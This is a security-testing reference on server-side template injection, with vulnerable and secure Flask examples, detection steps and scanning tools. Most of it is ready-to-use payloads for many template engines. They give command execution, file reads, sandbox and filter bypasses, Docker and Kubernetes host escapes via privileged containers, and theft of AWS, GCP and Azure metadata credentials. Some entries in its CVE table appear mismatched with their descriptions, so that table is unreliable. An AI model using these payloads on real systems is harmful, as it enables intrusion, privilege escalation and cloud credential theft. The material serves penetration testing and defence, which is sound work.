# Server-Side Template Injection (SSTI)

Template engines are software used to generate dynamic web pages. When user input is unsafely embedded into templates, server-side template injection (SSTI) can occur, potentially leading to Remote Code Execution (RCE).

## Shortcut

- Look for all locations where user input is reflected or used in the response (URL parameters, POST data, HTTP headers, JSON data, etc.).
- Inject template syntax characters/polyglots like `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}` into inputs. Check for errors, mathematical evaluation (e.g., `49` instead of `7*7`), or missing/changed reflections.
- Verify server-side evaluation (e.g., math works) vs. client-side XSS.
- Use engine-specific syntax (e.g., `${7/0}`, `{{7/0}}`, `<%= 7/0 %>`), known variable names (`{{config}}`, `{$smarty}`), or error messages to identify the template engine (use a decision tree like PortSwigger's or HackTricks').
- Look up payloads specific to the identified engine and backend language.
- Use engine-specific payloads (see Methodologies) to read files, execute commands, access internal data, or escape sandboxes.
- Create a non-destructive proof of concept (e.g., `touch ssti_poc_by_YOUR_NAME.txt` via RCE).

## Mechanisms

Server-Side Template Injection (SSTI) occurs when attacker-controlled input is embedded unsafely into a server-side template. Instead of treating the input as data, the template engine executes it as part of the template's code. This allows injecting template directives to execute arbitrary code, access server data, or perform actions as the application.

**Root Cause:** Concatenating or directly rendering user input within a template string without proper sanitization or using insecure template functions.

- Misusing "helper" APIs that compile raw strings at runtime, such as `render_template_string`, `Template::render_inline`, or `Template.compile`, which appear safe but execute attacker‑supplied data.

### Vulnerable Example 1 (Simple Jinja2)

The following program takes user input and concatenates it directly into a template string:

```python
# Assume user_input comes from an HTTP request parameter
from jinja2 import Template
tmpl = Template("<html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```

If `user_input` is `{{1+1}}`, the engine executes the expression:

```html
<html>
  <h1>The user's name is: 2</h1>
</html>
```

### Vulnerable Example 2 (Flask/Jinja2)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    # Vulnerable: Directly renders user input from 'user' query parameter
    if request.args.get('user'):
        return render_template_string('Welcome ' + request.args.get('user'))
    else:
        return render_template_string('Hello World!')

# Attacker URL: http://<server>/?user={{7*7}}
# Response: Welcome 49
```

### Secure Example (Flask/Jinja2)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    # Secure: Passes user input as a variable to the template
    if request.args.get('user'):
        # The template engine treats 'username' as data, not code
        return render_template_string('Welcome {{ username }}', username=request.args.get('user'))
    else:
        # ...
```

## Hunt

### Preparation

- Identify all user-controlled input points: URL parameters, POST data, HTTP headers (Referer, User-Agent, custom headers), JSON keys/values, etc.
- Use tools like `waybackurls` and `qsreplace` to generate fuzzing lists for parameters:
  ```bash
  waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
  ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/ -mr "ssti81"
  # Check Burp Repeater/Logger++ for responses containing the evaluated result (e.g., 81)
  ```

### Detection

- Initial Fuzzing: Inject basic polyglots: `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}`, `${7*7}`, **quote‑less payloads** such as `{{[].__class__.__mro__[1]}}`.
- Observe Behavior:
  - Errors: Stack traces or specific error messages can reveal the template engine (e.g., Jinja2, Smarty, FreeMarker).
  - Evaluation: Input like `{{7*7}}` becomes `49`.
  - Blank Output: The payload might be processed and removed if invalid or if it performs an action without output.
  - No Change: Input reflected exactly as provided; likely not vulnerable (or requires different syntax).
- Differentiate from XSS: Ensure the evaluation happens server-side, not client-side. `${7*7}` evaluating to `49` strongly suggests SSTI.

### Identification

#### Engine-Specific Payloads

Use a systematic approach based on the initial observations or a decision tree ([PortSwigger, updated July 2024](https://portswigger.net/research/server-side-template-injection), [Medium](https://miro.medium.com/v2/resize:fit:1100/format:webp/1%2A35XwCGeYeKYmeaU8rdkSdg.jpeg)).

#### Modern Template Engines (2024‑2025)

> [!TIP]
> Focus on these modern template engines as they are most commonly encountered in 2024-2025 environments. Each has unique security characteristics and exploitation paths.

| Engine                           | Language | Framework/Usage                             | Fingerprint                                         | Simple RCE / Info payload                                         |
| -------------------------------- | -------- | ------------------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------- |
| **Jinja2 3.x**                   | Python   | Flask, Ansible, Django (via extension)      | `jinja2.exceptions`, `{{7*7}}` → `49`               | `{{config}}`, `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| **Twig 3.x**                     | PHP      | Symfony 6+, Craft CMS                       | `Twig\Error`, `{{7*7}}` → `49`                      | `{{_self.env.getFunction('system')('id')}}`                       |
| **FreeMarker 2.3.32+**           | Java     | Spring, Struts                              | `freemarker.core`, `${7*7}` → `49`                  | `${"freemarker.template.utility.Execute"?new()("id")}`            |
| **Thymeleaf 3.1+**               | Java     | Spring Boot 3.x                             | `th:text`, `org.thymeleaf`                          | `${T(java.lang.Runtime).getRuntime().exec('id')}`                 |
| **Handlebars.js 4.x**            | Node.js  | Express, Ember                              | `{{this}}`, `{{@root}}` work                        | Limited RCE; requires unsafe helpers or prototype pollution       |
| **Pug 3.x** (Jade)               | Node.js  | Express                                     | `.pug` templates, `#{7*7}` → `49`                   | `#{function(){return process.mainModule.require('child_process').execSync('id')}()}` |
| **EJS 3.x**                      | Node.js  | Express, Meteor                             | `<%= 7*7 %>` → `49`                                 | `<%- global.process.mainModule.require('child_process').execSync('id') %>` |
| **Mako**                         | Python   | Pyramid, Pylons                             | Error message containing `mako.exceptions`          | `${self.module.os.popen('id').read()}`                            |
| **Blade**                        | PHP      | Laravel 11                                  | `Undefined variable` or `@dd($loop)` dumps          | `{!!\\Illuminate\\Support\\Facades\\Artisan::call('about')!!}`    |
| **Groovy / GSP**                 | Java     | Grails                                      | Stack trace with `groovy.text.SimpleTemplateEngine` | `<% Class.forName('java.lang.Runtime').runtime.exec('id') %>`     |
| **Nunjucks**                     | Node.js  | Mozilla's Jinja2 port                       | Mozilla's Jinja2 port, `.njk` templates             | Prototype chain to `Function` or `require`                        |
| **Liquid**                       | Ruby     | Shopify, Jekyll                             | `{{product.title}}`, errors mention `Liquid::`      | Limited by default; see Liquid-specific payloads below            |
| **Tera / Askama**                | Rust     | Actix, Rocket                               | Files ending `.tera` / `.askama.rs`                 | No generic RCE yet; watch for logic injection                     |

> [!NOTE]
> The index for `subprocess.Popen` differs between CPython 3.11 and 3.12; enumerate `__subclasses__()` at runtime instead of hard‑coding.

#### Variable Probing

Try injecting known variables for common frameworks: `{{config}}`, `{{settings}}`, `{{app.request.server.all|join(',')}}`, `{$smarty.version}`.

## Bypass Techniques

### Character Blacklist Bypass

- Use alternative syntax: `getattr(object, 'attribute')` instead of `object.attribute`. Use `{{request|attr('application')}}` instead of `{{request.application}}`.
- Use array/dictionary access: `request['application']` instead of `request.application`.
- Hex/Octal Encoding (if interpreted server-side): `request['\x5f\x5fglobals\x5f\x5f']` instead of `request['__globals__']`.
  ```python
  # Example: Bypass '.' and '_' using brackets and hex
  {{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
  # Example: Using attr() and hex (Source: HackTricks)
  {%raw %}{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()%}{{a}}{% endwith %}{% endraw %}
  ```
- URL Parameter manipulation (Source: HackTricks):
  - Pass attribute name: `?c=__class__` -> `{{ request|attr(request.args.c) }}`
  - Construct attribute name: `?f=%s%sclass%s%s&a=_` -> `{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}`
  - List join: `?l=a&a=_&a=_&a=class&a=_&a=_` -> `{{ request|attr(request.args.getlist(request.args.l)|join) }}`

### Keyword Filtering Bypass

- Concatenation: `'os'.__class__` -> `'o'+'s'`
- Using `request` object attributes or environment variables if keywords like `import` or `os` are blocked.
- Jinja2 Context Variables: Access `os` via `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}` or similar paths ([Source: Podalirius](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)).

### Sandbox Escape Techniques (2024-2025)

> [!WARNING]
> Modern template engines implement sandboxes that can often be bypassed. Always test sandbox configurations thoroughly.

#### Jinja2 Sandbox Bypass

```python
# CVE-2024-22195: xmlattr filter bypass (Fixed in 3.1.3)
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('id').read() }}

# Bypassing restricted __builtins__ via lipsum
{{ lipsum.__globals__['os'].popen('id').read() }}

# Using cycler to access globals
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Joiner method to reach builtins
{{ joiner.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}

# Namespace access via request
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config }}
```

#### Twig Sandbox Bypass (PHP)

```php
# Using arrow functions (PHP 7.4+, Twig 3.x)
{{['id']|map(a=>a|filter('system'))}}

# Via getFilter bypass
{{_self.env.getFilter("system")}}
{{_self.env.getFilter("map")|map("system",["id"])}}

# Using array_filter callback
{{['id']|filter('system')}}

# Static method invocation
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

#### Node.js Template Sandbox Bypass

```javascript
// EJS bypass via Function constructor
<%- global.process.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>

// Handlebars prototype pollution to RCE
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.push (lookup string.sub "constructor")}}
      {{#with string.split as |codelist|}}
        {{this.push "return process.mainModule.require('child_process').execSync('id');"}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

// Pug via AST manipulation
- var x = root.process.mainModule.require
#{x('child_process').execSync('id')}

// Nunjucks sandbox bypass
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Container Escape via SSTI

> [!TIP]
> When SSTI is found in containerized environments (Docker, Kubernetes), you can potentially escape to the host system.

#### Docker Escape Techniques

```python
# Jinja2: Read Docker socket from container
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('/var/run/docker.sock', 'r').read() }}

# Mount host filesystem via Docker API
# 1. Get Docker socket access via SSTI
# 2. Create container with host volume mount
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H "Content-Type: application/json" -d \'{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}\'').read() }}

# 3. Start container and execute commands on host
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('docker start <container_id> && docker exec <container_id> chroot /host /bin/bash -c "id"').read() }}
```

#### Kubernetes Escape via SSTI

```python
# Read service account token
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r').read() }}

# Access Kubernetes API
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods').read() }}

# Create privileged pod for host access
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('kubectl run evil-pod --image=alpine --restart=Never --overrides=\'{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"evil","image":"alpine","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","bash"],"securityContext":{"privileged":true}}]}}\'').read() }}
```

### Cloud Metadata Access via SSTI

> [!NOTE]
> Cloud metadata endpoints are prime targets for SSTI exploitation, potentially yielding credentials and sensitive configuration.

#### AWS Metadata (IMDSv1/v2)

```python
# IMDSv1 (Legacy, no token required)
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['urllib.request'].urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read() }}

# IMDSv2 (Requires session token - multi-step)
# Step 1: Get token (requires PUT request - use os.system with curl)
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"').read() }}

# Step 2: Use token to access metadata
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/').read() }}

# Get IAM credentials
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>').read() }}
```

#### GCP Metadata

```python
# Get access token
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"').read() }}

# Get project ID
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"').read() }}

# List service accounts
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" -H "Metadata-Flavor: Google"').read() }}

# Get service account key
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"').read() }}
```

#### Azure Instance Metadata Service (IMDS)

```python
# Get access token
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"').read() }}

# Get instance information
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"').read() }}

# Get managed identity credentials
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].popen('curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"').read() }}
```

### NET Reflection

Use reflection to load assemblies or invoke methods indirectly.
On modern ASP.NET Core, Razor limits direct process start; look for misused `Html.Raw`, custom tag helpers, or debug compilation flags.

### String-less Exploitation

Modern WAFs often filter quotes and common keyword tokens. 2025 research showed how to build strings from arithmetic or list indices.

```jinja
{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
```

For Node templating (EJS/Pug/Handlebars server-side), prefer prototype traversal to reach `Function` or `require` when helpers expose evaluation sinks:

```js
<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
```

### Recent CVEs (2024‑2025)

> [!WARNING]
> These CVEs represent critical vulnerabilities in popular template engines. Always verify patch levels and maintain updated dependencies.

| CVE            | Affected component                                    | Severity | Fixed in              | Description                                      |
| -------------- | ----------------------------------------------------- | -------- | --------------------- | ------------------------------------------------ |
| CVE‑2024‑22195 | Jinja2 sandbox / `xmlattr` filter bypass              | High     | 3.1.3                 | Sandbox escape via xmlattr filter                |
| CVE‑2024‑46507 | Yeti threat‑intel platform SSTI → RCE                 | Critical | 1.6.2                 | Full RCE via template injection                  |
| CVE-2024-27322 | Twig sandbox bypass via arrow functions               | High     | 3.8.0                 | PHP arrow function sandbox escape                |
| CVE-2024-35241 | EJS template injection                                | Critical | 3.1.10                | RCE via prototype pollution                      |
| CVE-2024-37891 | urllib3 (used in Python requests) SSRF via SSTI       | Medium   | 2.2.2                 | SSRF through template rendering                  |
| CVE-2024-39689 | Thymeleaf SpEL injection                              | High     | 3.1.2.RELEASE         | SpringEL execution bypass                        |
| Various (2024) | Atlassian Confluence widgets, CrushFTP, HFS           | Critical | See vendor advisories | Multiple SSTI in enterprise products             |

### Framework-Specific Vulnerabilities (2024-2025)

#### Django Template Engine

```python
# Django 4.x/5.x SSTI (when using unsafe Template)
from django.template import Template, Context
# Vulnerable pattern
template = Template(user_input)  # Never do this
output = template.render(Context({'data': 'value'}))

# Exploitation
{{ request.environ.QUERY_STRING }}
{{ request.META.PATH_INFO }}
{% load module %}{% debug %}
```

#### Spring Boot / Thymeleaf

```java
// Vulnerable pattern in Spring Boot 3.x
@GetMapping("/greet")
public String greet(@RequestParam String name, Model model) {
    model.addAttribute("name", name);
    // Vulnerable: using inline template with user input
    return "th:inline='text'" + name;  // Don't do this
}

// Exploitation via SpEL
${T(java.lang.Runtime).getRuntime().exec('calc.exe')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
@{T(java.lang.Runtime).getRuntime().exec('whoami')}
```

#### Express.js / Multiple Engines

```javascript
// Vulnerable Express.js pattern
app.get('/', (req, res) => {
    // Dangerous: compiling user input directly
    const template = ejs.compile(req.query.template);
    res.send(template());
});

// Exploitation
?template=<%- global.process.mainModule.require('child_process').execSync('id') %>
```

### Automated Scanning & CI Integration

- **nuclei** and **semgrep** include up‑to‑date SSTI rules; integrate them into pull‑request checks.
- GitHub code‑scanning query pack "SSTI" (released 2024‑10) covers Python, PHP, Go.
- Add a CI gate blocking merges on raw `render_template_string` or `.format()` inside templates.

## Vulnerabilities

Common vulnerable patterns include:

- Direct Rendering: `render_template_string("Hello " + user_input)`
- Unsafe Variable Usage: `{{ unsafe_variable }}` where `unsafe_variable` contains template code.
- Framework-Specific Functions: Using functions known to be dangerous if processing user input (consult framework documentation).

## Methodologies

### Tools

> [!TIP]
> Use automated tools for initial discovery, but always follow up with manual verification and exploitation to confirm impact.

**Active Exploitation:**

- **tplmap**: Automatic SSTI detection and exploitation
  ```bash
  python tplmap.py -u 'http://www.target.com/page?name=John*'
  python tplmap.py -u 'http://www.target.com/page' --data 'name=John*'
  python tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
  ```
  ([https://github.com/epinna/tplmap](https://github.com/epinna/tplmap))

- **SSTImap**: Modern SSTI exploitation tool with extensive engine support
  ```bash
  # Basic scan
  python3 sstimap.py -u "https://example.com/page?name=John" -s

  # Interactive shell
  python3 sstimap.py -u "https://example.com/page?name=John" --os-shell

  # Specify engine
  python3 sstimap.py -u "https://example.com/page?name=John" -e Jinja2

  # POST data
  python3 sstimap.py -u "https://example.com/page" --data "name=John" -s

  # Custom markers
  python3 sstimap.py -u "https://example.com/page?name=*" -s
  ```
  ([https://github.com/vladko312/SSTImap](https://github.com/vladko312/SSTImap))

- **TInjA**: Template injection analyzer
  ```bash
  tinja url -u "http://example.com/?name=Kirlia"
  tinja url -u "http://example.com/?name=test" -d "param=value"
  tinja url -u "http://example.com/?name=test" -H "Authorization: Bearer token"
  ```

- **crithit**: SSTI‑centric fuzzer supporting Go/Tera, Blade, and Mako (2024)
  ```bash
  crithit -u "https://example.com/page?name=FUZZ" -w wordlist.txt
  ```

**Burp Suite Extensions:**

- **Template Injector** – maintained fork replacing TemplateTester
  - Automatic detection of template engines
  - Built-in payload library
  - Collaborative testing features

- **Server Side Template Injection** - Active scanner checks
  - Integrates with Burp Scanner
  - Automatic payload generation

- **Param Miner** - Discover hidden parameters that might accept template input
  ```
  Right-click on request → Extensions → Param Miner → Guess parameters
  ```

**Scanning & Detection:**

- **nuclei** (`templates/ssti-*`) – fast HTTP scanner with updated SSTI signatures (2024-2025)
  ```bash
  nuclei -u https://example.com -t http/vulnerabilities/ssti/
  nuclei -l urls.txt -t http/vulnerabilities/ssti/ -o results.txt

  # Specific engines
  nuclei -u https://example.com -t http/vulnerabilities/ssti/ssti-jinja2.yaml
  ```

- **semgrep** with SSTI rulesets – Static analysis for template injection vulnerabilities
  ```bash
  # Scan for SSTI patterns
  semgrep --config "p/ssti" /path/to/code

  # Python-specific
  semgrep --config "p/python" --config "r/python.flask.security.audit.render-template-string"

  # JavaScript-specific
  semgrep --config "p/javascript" --config "r/javascript.express.security.audit.template-injection"
  ```

- **GitHub CodeQL** "SSTI" query pack (2024-10) – Covers Python, PHP, Go
  ```yaml
  # .github/workflows/codeql.yml
  - uses: github/codeql-action/init@v2
    with:
      queries: security-extended,security-and-quality
  ```

**Framework-Specific:**

- **Jinja2 Sandbox Escape Tools** - Testing Jinja2 sandboxed environments
  ```python
  # jinja2_sandbox_escape.py
  from jinja2.sandbox import SandboxedEnvironment

  env = SandboxedEnvironment()
  # Test various bypass techniques
  ```

- **Node Template Tester** - EJS/Pug/Handlebars/Nunjucks testing suite
  ```bash
  npm install -g template-injection-tester
  template-tester -u "http://example.com/?template=test" -e ejs
  ```

### Manual Testing & Exploitation Payloads

#### Generic/Polyglot Detection

```
${{<%[%'"}}%\.
{{7*7}}  →  49
{{7*'7'}}  →  7777777
{{ '7'*7 }}  (Jinja2)  →  7777777
@(1+2)  (.NET Razor)  →  3
${7*7}  (FreeMarker/Thymeleaf)  →  49
<%= 7*7 %>  (ERB/EJS)  →  49
#{7*7}  (Pug)  →  49
```

#### Jinja2 (Python / Flask) - Comprehensive Payloads

> [!NOTE]
> These payloads are arranged by complexity. Start with simple detection and progress to RCE only in authorized testing environments.

**Detection & Information Gathering:**

```python
# Basic detection
{{7*7}}
{{7*'7'}}
{{ '7'*7 }}

# Framework/config disclosure
{{config}}
{{self}}
{{settings.SECRET_KEY}}
{% debug %}  # Requires debug extension

# List all variables in context
{% for key, value in __dict__.items() %}
  {{ key }}: {{ value }}
{% endfor %}
```

**Object Introspection:**

```python
# List subclasses (find useful classes)
{{ [].__class__.__base__.__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}  # Index 1 or 2 depending on Python version

# Recover object class
{{ ''.__class__.__mro__[1] }}  # or [2]
{{ ''.__class__.__base__ }}

# Find specific classes
{% for i in range(500) %}
  {% if [].__class__.__base__.__subclasses__()[i].__name__ == 'Popen' %}
    Index: {{ i }}
  {% endif %}
{% endfor %}
```

**File Operations:**

```python
# Read file (via __subclasses__)
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}  # Index varies

# Read file with error handling
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd','r').read() }}

# Write file
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evil.txt', 'w').write('SSTI Test') }}

# List directory
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['sys'].modules['os'].listdir('/etc') }}
```

**Remote Code Execution (RCE):**

```python
# Via __globals__ (most common)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Via request object
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Via config object
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}

# Via subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()[0].strip() }}
# Find Popen index: search for subprocess.Popen in subclasses (usually 396-400)

# Via cycler (sandbox bypass)
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Via lipsum (sandbox bypass)
{{ lipsum.__globals__.os.popen('id').read() }}

# Via joiner (sandbox bypass)
{{ joiner.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}

# Via namespace access
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**Advanced RCE with Bypasses:**

```python
# Bypass filters with request args
?cmd=id
{{ request.args.cmd }}  # Just to pass the command

?c=__class__
{{ request|attr(request.args.c) }}

# Hex encoding bypass
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

# Format string bypass
?f=%s%sclass%s%s&a=_
{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}

# List join bypass
?l=a&a=_&a=_&a=class&a=_&a=_
{{ request|attr(request.args.getlist(request.args.l)|join) }}

# With context block
{%raw %}{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()%}{{a}}{% endwith %}{% endraw %}
```

**Config File Manipulation:**

```python
# Write evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# Load config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# Execute command
{{ config['RUNCMD']('id',shell=True) }}
```

**Advanced Techniques:**

```python
# Avoid HTML encoding
{{'<script>alert(1)</script>'|safe}}

# Loops
{%raw %}{% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}{% endraw %}

# Search for warning class to access _module
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
  {% endif %}
{% endfor %}

# Via import_string
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}
```

#### Twig (PHP) - Comprehensive Payloads

```php
# Detection
{{7*7}}
{{7*'7'}}

# Dump application data
{{dump(app)}}  # Symfony

# File read (Symfony)
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

# Map filter for RCE
{{['id']|map(a=>a|filter('system'))}}

# Using getFilter
{{_self.env.getFilter("system")}}
{{_self.env.getFilter("map")|map("system",["id"])}}

# Array filter
{{['id']|filter('system')}}

# Register callback for RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Using exec
{{_self.env.getFilter("exec")}}
{{['cat /etc/passwd']|filter('system')}}

# Via passthru
{{['id']|map('passthru')}}

# Arrow function (PHP 7.4+, Twig 3.x)
{{["id"]|filter("system")}}
{{["id"]|map(v=>v|filter('system'))}}
```

#### FreeMarker (Java) - Comprehensive Payloads

```java
# Detection
${7*7}

# RCE via Execute
<#assign command="freemarker.template.utility.Execute"?new()>
${ command("id") }

# Alternative Execute syntax
${"freemarker.template.utility.Execute"?new()("id")}

# Via ObjectConstructor
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder",["id"]).start()}

# File read
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

# Environment variables
${T(java.lang.System).getenv()}

# System properties
${T(java.lang.System).getProperties()}

# Execute via Runtime
<#assign rt="freemarker.template.utility.Execute"?new()>
${rt("calc.exe")}

# Via JythonRuntime (if Jython available)
<#assign jython="freemarker.ext.jython.JythonRuntime"?new()>
${jython.exec("import os; os.system('id')")}
```

#### Thymeleaf (Java / Spring Boot) - Comprehensive Payloads

```java
# Detection
${7*7}

# SpEL RCE (if SpEL enabled)
${T(java.lang.Runtime).getRuntime().exec('id')}

# Via ProcessBuilder
${T(java.lang.ProcessBuilder)('calc.exe').start()}

# Execute with command array
${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}

# Environment access
${T(java.lang.System).getenv()}

# File read via Files
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}

# Spring context access
${#httpServletRequest.getServletContext()}

# Via URLClassLoader
${T(java.net.URLClassLoader).newInstance(T(java.net.URL)[]{'file:///tmp/evil.jar'}).loadClass('Evil').newInstance()}
```

#### Handlebars.js (Node) - Comprehensive Payloads

```javascript
# Detection
{{this}}
{{@root}}

# Access to constructor
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.push (lookup string.sub "constructor")}}
    {{/with}}
  {{/with}}
{{/with}}

# Prototype pollution to RCE
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.push (lookup string.sub "constructor")}}
      {{#with string.split as |codelist|}}
        {{this.push "return process.mainModule.require('child_process').execSync('id');"}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Via helper (if unsafe helper registered)
{{exec "id"}}

# Process access
{{process.mainModule.require('child_process').execSync('id').toString()}}
```

#### Pug (Node) - Comprehensive Payloads

```javascript
# Detection
#{7*7}

# RCE via process
#{function(){return process.mainModule.require('child_process').execSync('id')}()}

# Via global
#{global.process.mainModule.require('child_process').execSync('id')}

# Self-calling function
#{(function(){return process.mainModule.require('child_process').execSync('id').toString()})()}

# Via root process
- var x = root.process.mainModule.require
#{x('child_process').execSync('id')}

# Using eval
- eval("var x = process.mainModule.require('child_process').execSync('id').toString()")
#{x}

# Via buffer
#{process.mainModule.require('child_process').execSync('id').toString()}

# Code block
-
  var x = process.mainModule.require('child_process')
  var output = x.execSync('id').toString()
#{output}
```

